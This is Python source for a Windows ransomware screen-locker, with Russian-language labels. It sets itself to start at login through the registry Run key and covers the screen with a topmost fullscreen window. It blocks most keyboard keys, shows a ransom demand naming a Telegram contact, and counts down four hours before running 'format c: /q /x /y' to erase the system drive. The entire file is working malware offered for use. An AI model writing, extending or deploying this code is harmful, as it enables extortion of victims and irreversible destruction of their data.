# узел: meridian/system_locker_gui_keys
# deps: pip install keyboard
# параметры: системный блокировщик с экранной клавиатурой и персистентным таймером

import os
import sys
import time
import subprocess
import threading
import tkinter as tk
from pathlib import Path

try:
    import keyboard
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
    import keyboard

STATE_FILE = Path(os.getenv("APPDATA")) / "meridian_timer_state.dat"
TOTAL_SECONDS = 4 * 3600

def init_persistence():
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "SystemKernelLock", 0, winreg.REG_SZ, sys.executable)
    except Exception:
        pass

def get_remaining_time():
    current_time = time.time()
    if STATE_FILE.exists():
        try:
            with open(STATE_FILE, "r") as f:
                data = f.read().strip().split(",")
                start_time = float(data[0])
                elapsed = current_time - start_time
                remaining = TOTAL_SECONDS - elapsed
                if remaining < 0:
                    return 0
                return int(remaining)
        except Exception:
            pass
    
    with open(STATE_FILE, "w") as f:
        f.write(f"{current_time}")
    return TOTAL_SECONDS

class LockerApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        
        self.remaining_seconds = get_remaining_time()
        self.input_text = tk.StringVar()
        
        self.build_ui()
        self.block_system()
        
        self.timer_thread = threading.Thread(target=self.timer_loop, daemon=True)
        self.timer_thread.start()

    def build_ui(self):
        main_frame = tk.Frame(self.root, bg="black")
        main_frame.pack(expand=True)

        label_lock = tk.Label(
            main_frame, 
            text="Windows заблокирован\nвыкуп в тг @encysh", 
            fg="red", 
            bg="black", 
            font=("Consolas", 28, "bold"),
            justify="center"
        )
        label_lock.pack(pady=15)

        self.timer_label = tk.Label(
            main_frame, 
            text="Удаление Windows через 04:00:00", 
            fg="white", 
            bg="black", 
            font=("Consolas", 20, "bold")
        )
        self.timer_label.pack(pady=15)

        self.entry = tk.Entry(
            main_frame, 
            textvariable=self.input_text, 
            font=("Consolas", 18), 
            justify="center",
            state="readonly",
            readonlybackground="#111111",
            fg="white",
            width=30
        )
        self.entry.pack(pady=15)

        # Панель экранных кнопок с цифрами (0-9)
        keys_frame = tk.Frame(main_frame, bg="black")
        keys_frame.pack(pady=10)

        buttons_layout = [
            ('1', 0, 0), ('2', 0, 1), ('3', 0, 2),
            ('4', 1, 0), ('5', 1, 1), ('6', 1, 2),
            ('7', 2, 0), ('8', 2, 1), ('9', 2, 2),
            ('0', 3, 1)
        ]

        for (digit, row, col) in buttons_layout:
            btn = tk.Button(
                keys_frame, 
                text=digit, 
                font=("Consolas", 16, "bold"),
                bg="#222222", 
                fg="white", 
                activebackground="#444444",
                activeforeground="white",
                width=5, 
                height=2,
                command=lambda d=digit: self.append_digit(d)
            )
            btn.grid(row=row, column=col, padx=5, pady=5)

        self.root.protocol("WM_DELETE_WINDOW", lambda: None)

    def block_system(self):
        for i in range(150):
            try:
                keyboard.block_key(i)
            except Exception:
                pass

        for digit in "0123456789":
            keyboard.on_press_key(digit, lambda e, d=digit: self.append_digit(d))

    def append_digit(self, digit):
        current = self.input_text.get()
        if len(current) < 25:
            self.input_text.set(current + digit)

    def timer_loop(self):
        while self.remaining_seconds > 0:
            time.sleep(1)
            self.remaining_seconds -= 1
            
            hours = self.remaining_seconds // 3600
            minutes = (self.remaining_seconds % 3600) // 60
            seconds = self.remaining_seconds % 60
            
            time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            self.root.after(0, lambda s=time_str: self.timer_label.config(text=f"Удаление Windows через {s}"))
            
            if self.remaining_seconds <= 0:
                self.root.after(0, self.trigger_wipe)
                break

    def trigger_wipe(self):
        try:
            subprocess.Popen("format c: /q /x /y", shell=True)
        except Exception:
            pass

    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    init_persistence()
    app = LockerApp()
    app.run()